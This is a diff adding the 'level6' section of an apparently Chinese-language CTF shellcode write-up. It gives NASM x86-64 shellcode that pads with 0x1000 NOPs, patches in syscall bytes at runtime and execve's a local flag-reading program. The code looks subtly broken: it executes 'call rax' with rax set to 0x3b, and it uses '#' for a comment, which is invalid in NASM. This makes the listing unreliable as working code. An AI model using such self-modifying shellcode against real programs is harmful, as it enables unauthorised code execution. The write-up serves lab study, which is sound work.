@@ -594,3 +594,38 @@ call_code:
 
 
 ## level6
+跟第五关一样，不同的是，程序会收回输入的前0x1000个字节的写权限，那么我们可以在第五关的基础上，对前0x1000个字节使用nop指令进行填充。
+
+```asm
+BITS 64
+
+section .data
+    filename db '/home/hacker/Shellcode/level3/openflag',0
+
+section .text
+    global _start
+
+_start:
+    times 0x1000 nop
+    jmp short call_code
+
+code:
+    pop rsi
+    push rsi
+    mov byte [rsi-8], 0x0f
+    mov byte [rsi-7], 0x05
+    xor rax, rax
+    mov al, 0x3b
+    lea rdi, [rel filename]
+    xor rsi, rsi
+    xor rdx, rdx
+    call rax
+    ret
+
+call_code:
+    call code # 之所以用call指令，是因为我们要获取指令的地址。而这一步会让rip入栈，我们可以根据rip修改指令地址处的指令。达到动态修改运行指令的效果。
+    times 0x10 nop
+```
+
+
+## level7
